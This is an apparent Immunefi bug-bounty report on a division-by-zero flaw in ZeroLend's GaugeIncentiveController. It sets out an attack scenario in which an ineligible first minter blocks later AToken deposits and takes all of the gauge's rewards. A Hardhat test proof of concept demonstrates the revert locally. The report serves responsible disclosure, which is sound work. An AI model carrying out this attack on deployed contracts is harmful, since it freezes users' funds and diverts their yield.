# 29052 - \[SC - Medium] Pool funds could be locked due to Division by zero

Submitted on Mar 5th 2024 at 22:04:05 UTC by @DuckAstronomer for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29052

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield
* Temporary freezing of funds for at least 1 hour

## Description

## Vulnerability Details

**Affected asset**: governance-main/contracts/voter/gauge/GaugeIncentiveController.sol

The `rewardPerToken()` function in `GaugeIncentiveController` verifies `totalSupply` for zero, but utilizes `derivedSupply` for calculation of the rewardPerToken value. If `derivedSupply` equals zero, `rewardPerToken()` reverts due to division by zero.

<https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L48>

```
function rewardPerToken(
    IERC20 token
) public view override returns (uint256) {
    if (totalSupply == 0) return rewardPerTokenStored[token];

    // derivedSupply is used instead of totalSupply to modify for ve-BOOST
    return
        rewardPerTokenStored[token] +
        (((lastTimeRewardApplicable(token) - lastUpdateTime[token]) *
            rewardRate[token] *
            PRECISION) / derivedSupply);
}
```

The `handleAction()` function in `GaugeIncentiveController` serves as a callback for **AToken** to invoke upon changes in the user's balance (such as minting or burning). Within `handleAction()`, it initially triggers `_updateReward()`, which subsequently calls `rewardPerToken()`.

* <https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L87>
* <https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L109>
* <https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L117>

In scenarios where `totalSupply` is not equal to zero, and if `derivedSupply` does equal zero, any alterations in **AToken** (e.g., minting or burning) will result in a revert. This effectively locks the user's funds.

The value of `derivedSupply` is determined through `governance-main/contracts/voter/eligibility/EligibilityCriteria.sol`.

<https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L68>

```
function derivedBalance(address account) public view returns (uint256) {
    uint256 _balance = (balanceOf[account] *
        oracle.getAssetPrice(oracleAsset)) / 1e8;

    if (_balance == 0) return 0;

    uint256 multiplierE18 = eligibility.checkEligibility(account, _balance);
    return (_balance * multiplierE18) / 1e18;
}
```

For instance, to qualify, a user must mint **AToken** and stake over 5% of **ZeroLend** tokens. <https://github.com/zerolend/governance/blob/main/contracts/voter/eligibility/EligibilityCriteria.sol#L50>

In summary, an attacker could block other users' funds and receive rewards from the gauge by being the first to invoke `handleAction()` or `updateUser()`.

**The attack scenario is the following**:

1. A pool is assigned a new gauge (gauge change occurs). At that point `totalSupply` and `derivedSupply` are **0**.
2. The attacker becomes the first **AToken** minter after gauge change (or just calls `updateUser(address who)`).
3. Attacker doesn't stake **5%** of ZeroLend, so `totalSupply > 0`, but `derivedSupply == 0`.
4. Subsequent **AToken** actions within the pool will trigger reverts.
5. Consequently, the attacker locks users' funds in the pool and earns rewards from the gauge as the sole staker.

## Proof of Concept

**To run the Poc**:

1. Put the code from below to the `governance-main/test/Gauge.poc.2.ts` file.
2. Generate random private key.
3. Modify `governance-main/contracts/voter/eligibility/MockEligibilityCriteria.sol` file so the `checkEligibility()` function returns **0** instead of **1e18**.
4. Issue the following command:

```
WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/Gauge.poc.2.ts --config hardhat.config.ts --network hardhat
```

**PoC scenario**:

1. Ant is the first who mints **AToken** in a pool with new Gauge.
2. Ant isn't eligible for reward, but it has **AToken** amount. So, `totalSupply > 0`, but `derivedSupply == 0`.
3. Whale aren't able to mint **AToken** due to division by zero panic.

```
import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import {
  GaugeIncentiveController,
  OmnichainStaking,
  Pool,
  PoolVoter,
  StakingBonus,
  TestnetERC20,
  VestedZeroNFT,
  ZeroLend,
} from "../typechain-types";
import { e18 } from "./fixtures/utils";
import { deployVoters } from "./fixtures/voters";
import { ethers } from "hardhat";
import { time } from "@nomicfoundation/hardhat-network-helpers";

// Put inside governance-main/test/Gauge.poc.2.ts

// Change governance-main/contracts/voter/eligibility/MockEligibilityCriteria.sol
// to return 0 instead of 1e18 from checkEligibility()

// Run as:
// WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/Gauge.poc.2.ts --config hardhat.config.ts --network hardhat

describe.only("Immunefi Boost", () => {
  let ant: SignerWithAddress;
  let deployer: SignerWithAddress;
  let now: number;
  let omniStaking: OmnichainStaking;
  let poolVoter: PoolVoter;
  let reserve: TestnetERC20;
  let stakingBonus: StakingBonus;
  let vest: VestedZeroNFT;
  let pool: Pool;
  let aTokenGauge: GaugeIncentiveController;
  let zero: ZeroLend;
  let owner: SignerWithAddress;
  let whale: SignerWithAddress;

  beforeEach(async () => {
    const deployment = await loadFixture(deployVoters);
    ant = deployment.ant;
    now = Math.floor(Date.now() / 1000);
    omniStaking = deployment.governance.omnichainStaking;
    poolVoter = deployment.poolVoter;
    reserve = deployment.lending.erc20;
    stakingBonus = deployment.governance.stakingBonus;
    vest = deployment.governance.vestedZeroNFT;
    zero = deployment.governance.zero;
    pool = deployment.lending.pool;
    aTokenGauge = deployment.aTokenGauge;
    owner = deployment.governance.lending.owner;
    deployer = deployment.governance.deployer;
    whale = deployment.governance.whale;

    // deployer should be able to mint a nft for another user
    await vest.mint(
      ant.address,
      e18 * 20n, // 20 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      true, // penalty -> false
      0
    );

    // stake nft on behalf of the ant
    await vest
      .connect(ant)
      ["safeTransferFrom(address,address,uint256)"](
        ant.address,
        stakingBonus.target,
        1
      );

    // there should now be some voting power for the user to play with
    // ant voting power is ~ 19 ether
    expect(await omniStaking.balanceOf(ant.address)).lessThan(e18 * 20n);
  });

  it("Ant blocks AToken usage and gets all reward in Gauge", async function () {
    let gaugeToken = await aTokenGauge.aToken();
    let atoken = await ethers.getContractAt("AToken", gaugeToken);

    // Mint 1 WETH to ant
    await reserve.connect(owner)["mint(address,uint256)"](ant.address, 1n * e18);
    expect(await reserve.balanceOf(ant.address)).eq(1n * e18);

    // Mint 100 WETH to whale
    await reserve.connect(owner)["mint(address,uint256)"](whale.address, 100n * e18);
    expect(await reserve.balanceOf(whale.address)).eq(100n * e18);
    
    // Distribute reward, 1000 ZeroLend
    await zero.connect(deployer).approve(aTokenGauge.target, 1000n * e18);
    await aTokenGauge.connect(deployer).notifyRewardAmount(zero.target, 1000n * e18);

    // + 1 Hour
    await time.increase(3600);

    // Mint AToken from WETH for ant
    await reserve.connect(ant).approve(pool.target, 1n * e18);
    await pool.connect(ant).supply(reserve.target, 1n * e18, ant.address, 0n);
    expect(await atoken.balanceOf(ant.address)).greaterThan(0);

    // Mint AToken from WETH for whale ...
    // But it reverts due to division by 0
    // https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/GaugeIncentiveController.sol#L48
    await reserve.connect(whale).approve(pool.target, 100n * e18);
    await expect(
      pool.connect(whale).supply(reserve.target, 100n * e18, whale.address, 0n)
    ).to.be.revertedWithPanic(0x12); // division by zero panic
  });
});
```
